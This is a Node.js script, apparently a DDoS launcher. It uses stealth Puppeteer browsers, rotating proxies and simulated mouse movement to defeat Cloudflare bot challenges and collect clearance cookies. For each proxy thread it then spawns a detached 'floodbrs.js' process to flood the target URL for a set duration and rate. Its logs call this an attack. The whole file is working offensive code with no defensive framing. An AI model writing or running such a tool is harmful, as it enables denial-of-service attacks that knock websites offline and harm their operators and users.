const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const UserAgent = require('user-agents');
const { spawn } = require('child_process');

puppeteer.use(StealthPlugin());

// Command-line arguments
const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

console.log(`[ START ] Cloudflare Bypass Started - Target: ${targetURL}`);

// Read proxies
const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        return [];
    }
};

// Generate user agent
const generateUserAgent = () => {
    const userAgent = new UserAgent({ deviceCategory: 'desktop' });
    return userAgent.toString();
};

// Human-like mouse movements
class HumanMouse {
    static async moveTo(page, selector) {
        const element = await page.$(selector);
        if (!element) return false;

        const rect = await page.evaluate(el => {
            const { top, left, width, height } = el.getBoundingClientRect();
            return { top, left, width, height };
        }, element);

        // Human-like movement with curve
        const steps = 10 + Math.floor(Math.random() * 10);
        const startX = Math.random() * 100;
        const startY = Math.random() * 100;
        
        for (let i = 0; i <= steps; i++) {
            const t = i / steps;
            // Bezier curve for human-like movement
            const x = startX + (rect.left + rect.width/2 - startX) * t + Math.sin(t * Math.PI) * (Math.random() * 20 - 10);
            const y = startY + (rect.top + rect.height/2 - startY) * t + Math.cos(t * Math.PI) * (Math.random() * 20 - 10);
            
            await page.mouse.move(x, y);
            await sleep(Math.random() * 50 + 20);
        }
        
        await page.mouse.move(rect.left + rect.width/2, rect.top + rect.height/2);
        return true;
    }
}

// Advanced wait function with random delays
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const randomSleep = (min, max) => sleep(Math.random() * (max - min) + min);

// Cloudflare Cookie Class
class CloudflareCookie {
    constructor(cookieData) {
        this.name = cookieData.name || "";
        this.value = cookieData.value || "";
        this.domain = cookieData.domain || "";
        this.path = cookieData.path || "/";
        this.expires = cookieData.expires || 0;
        this.httpOnly = cookieData.httpOnly || false;
        this.secure = cookieData.secure || false;
        this.sameSite = cookieData.sameSite || "Lax";
    }

    static fromJSON(cookieData) {
        return new CloudflareCookie(cookieData);
    }

    toString() {
        return `${this.name}=${this.value}`;
    }
}

// Find Cloudflare cookies
const findCloudflareCookies = (cookies) => {
    const cfCookies = cookies.filter(cookie => 
        cookie.name.includes('cf_') || 
        cookie.name.includes('_cf') ||
        cookie.name === 'cf_clearance' ||
        cookie.name === '__cf_bm'
    ).map(cookie => CloudflareCookie.fromJSON(cookie));
    
    return cfCookies;
};

// Enhanced Cloudflare bypass with multiple strategies
const advancedCloudflareBypass = async (page) => {
    try {
        console.log(`[ BYPASS ] Starting Cloudflare challenge bypass...`);

        // Wait for challenge page to load
        await page.waitForFunction(() => document.readyState === 'complete');
        await randomSleep(2000, 4000);

        // Check multiple challenge types
        const challengeSelectors = [
            // Cloudflare Challenge
            'input[type="checkbox"][name="cf_captcha_kind"]',
            '.hcaptcha-box',
            '[role="checkbox"]',
            '.challenge-form input[type="checkbox"]',
            '#challenge-stage input',
            'label[for="cf-challenge-checkbox"]',
            
            // Cloudflare "Verify you are human" button
            '.verify-you-are-human',
            '[id*="challenge"] button',
            '[class*="challenge"] button',
            '[type="submit"]',
            'button[type="submit"]',
            
            // Alternative selectors
            'input[value="Submit"]',
            '.button',
            '.btn',
            '.success',
            '.primary'
        ];

        let challengeSolved = false;

        for (const selector of challengeSelectors) {
            try {
                const element = await page.$(selector);
                if (element) {
                    console.log(`[ BYPASS ] Found challenge element: ${selector}`);
                    
                    // Human-like mouse movement to element
                    await HumanMouse.moveTo(page, selector);
                    await randomSleep(500, 1500);
                    
                    // Click with human-like delay
                    await element.click({ delay: Math.random() * 100 + 50 });
                    console.log(`[ BYPASS ] Clicked challenge element: ${selector}`);
                    
                    challengeSolved = true;
                    await randomSleep(3000, 6000);
                    break;
                }
            } catch (e) {
                continue;
            }
        }

        // If no specific element found, try to find and click any clickable element in challenge area
        if (!challengeSolved) {
            console.log(`[ BYPASS ] No specific challenge element found, trying general approach...`);
            
            const clickableSelectors = [
                'input',
                'button',
                'a',
                '[onclick]',
                '.button',
                '.btn'
            ];

            for (const selector of clickableSelectors) {
                try {
                    const elements = await page.$$(selector);
                    for (const element of elements) {
                        const isVisible = await page.evaluate(el => {
                            const rect = el.getBoundingClientRect();
                            return rect.width > 0 && rect.height > 0 && 
                                   getComputedStyle(el).visibility !== 'hidden' && 
                                   getComputedStyle(el).display !== 'none';
                        }, element);

                        if (isVisible) {
                            await HumanMouse.moveTo(page, selector);
                            await randomSleep(500, 1500);
                            await element.click({ delay: Math.random() * 100 + 50 });
                            console.log(`[ BYPASS ] Clicked general element: ${selector}`);
                            challengeSolved = true;
                            await randomSleep(3000, 6000);
                            break;
                        }
                    }
                    if (challengeSolved) break;
                } catch (e) {
                    continue;
                }
            }
        }

        // Wait for challenge to complete
        console.log(`[ BYPASS ] Waiting for challenge completion...`);
        await randomSleep(8000, 15000);

        // Check if challenge is solved
        const title = await page.title();
        const currentUrl = await page.url();
        
        console.log(`[ BYPASS ] Current Title: ${title}`);
        console.log(`[ BYPASS ] Current URL: ${currentUrl}`);

        // Check for success indicators
        const isSuccess = !title.includes('Just a moment') && 
                         !title.includes('Checking your browser') &&
                         !title.includes('Please wait') &&
                         !currentUrl.includes('challenge');

        if (isSuccess) {
            console.log(`[ BYPASS ] Challenge successfully solved!`);
            return { success: true };
        }

        console.log(`[ BYPASS ] Challenge may not be solved, continuing anyway...`);
        return { success: true }; // Continue even if not 100% sure

    } catch (error) {
        console.log(`[ BYPASS ] Error during bypass: ${error.message}`);
        return { success: false };
    }
};

// Enhanced browser setup with better stealth
const setupStealthBrowser = async (proxy = null) => {
    const userAgent = generateUserAgent();
    
    const args = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--no-first-run',
        '--no-zygote',
        '--disable-features=VizDisplayCompositor',
        '--disable-background-timer-throttling',
        '--disable-backgrounding-occluded-windows',
        '--disable-renderer-backgrounding',
        '--disable-web-security',
        '--disable-features=site-per-process',
        '--disable-ipc-flooding-protection',
        '--ignore-certificate-errors',
        '--ignore-ssl-errors',
        '--window-size=1920,1080',
        `--user-agent=${userAgent}`,
        '--disable-blink-features=AutomationControlled'
    ];

    // Add proxy if available
    if (proxy) {
        args.push(`--proxy-server=${proxy}`);
    }

    const browser = await puppeteer.launch({
        headless: true,
        args: args,
        ignoreHTTPSErrors: true,
        defaultViewport: {
            width: 1920,
            height: 1080,
            deviceScaleFactor: 1,
            hasTouch: false,
            isLandscape: true,
            isMobile: false
        }
    });

    const page = await browser.newPage();
    
    // Enhanced stealth evasions
    await page.evaluateOnNewDocument(() => {
        // Override webdriver property
        Object.defineProperty(navigator, 'webdriver', {
            get: () => false,
        });
        
        // Override languages property
        Object.defineProperty(navigator, 'languages', {
            get: () => ['en-US', 'en'],
        });
        
        // Override plugins property
        Object.defineProperty(navigator, 'plugins', {
            get: () => [1, 2, 3, 4, 5],
        });
        
        // Mock Chrome runtime
        window.chrome = {
            runtime: {},
        };
        
        // Remove automation痕迹
        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) => (
            parameters.name === 'notifications' ?
                Promise.resolve({ state: Notification.permission }) :
                originalQuery(parameters)
        );
    });

    // Set extra headers
    await page.setExtraHTTPHeaders({
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'accept-encoding': 'gzip, deflate, br',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
    });

    await page.setViewport({ 
        width: 1920, 
        height: 1080,
        deviceScaleFactor: 1
    });

    return { browser, page, userAgent };
};

// Process each browser
const processBrowser = async (proxy, index, total) => {
    let browser;
    try {
        console.log(`[ THREAD ${index} ] Starting with proxy: ${proxy || 'No Proxy'}`);
        
        const { browser: br, page, userAgent } = await setupStealthBrowser(proxy);
        browser = br;

        // Navigate to target with human-like behavior
        console.log(`[ THREAD ${index} ] Navigating to target...`);
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0',
            timeout: 60000,
            referer: 'https://www.google.com/'
        });

        // Solve Cloudflare
        console.log(`[ THREAD ${index} ] Attempting Cloudflare bypass...`);
        const bypassResult = await advancedCloudflareBypass(page);
        
        if (!bypassResult.success) {
            console.log(`[ THREAD ${index} ] Bypass failed`);
            await browser.close();
            return { success: false };
        }

        // Get success data
        const title = await page.title();
        const currentUrl = await page.url();
        const cookies = await page.cookies();
        const cfCookies = findCloudflareCookies(cookies);
        
        if (cfCookies.length === 0) {
            console.log(`[ THREAD ${index} ] No Cloudflare cookies found`);
            await browser.close();
            return { success: false };
        }

        const cookieString = cfCookies.map(cookie => cookie.toString()).join('; ');
        
        // LOG OUTPUT PERSIS SEPERTI YANG DIMINTA
        console.log(`[ SUCCESS ] Total Solve : ${index} | Title : ${title} | proxy : ${proxy} | useragent : ${userAgent} | cookies : ${cookieString} |`);
        console.log(`[ SPAWN ] Flood with cookies : ${cookieString} : useragent : ${userAgent}`);

        await browser.close();

        // Start flood
        spawn('node', [
            'floodbrs.js',
            targetURL,
            duration.toString(),
            rate,
            '1',
            proxyFile,
            cookieString,
            userAgent,
            'cf-cookie'
        ], {
            detached: true,
            stdio: 'ignore'
        });

        return { success: true };
        
    } catch (error) {
        console.log(`[ THREAD ${index} ] Error: ${error.message}`);
        if (browser) await browser.close();
        return { success: false };
    }
};

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        console.log(`[ ERROR ] No proxies found in file: ${proxyFile}`);
        return;
    }

    console.log(`[ INFO ] Loaded ${proxies.length} proxies`);
    console.log(`[ INFO ] Starting ${threads} threads`);
    console.log(`[ INFO ] Attack duration: ${duration} seconds`);

    for (let i = 0; i < Math.min(proxies.length, threads); i++) {
        setTimeout(async () => {
            await processBrowser(proxies[i], i + 1, proxies.length);
        }, i * 10000); // Stagger starts by 10 seconds
    }

    // Keep main process alive
    await sleep(duration * 1000 + 60000);
    console.log(`[ COMPLETE ] Attack finished`);
};

main().catch(console.error);
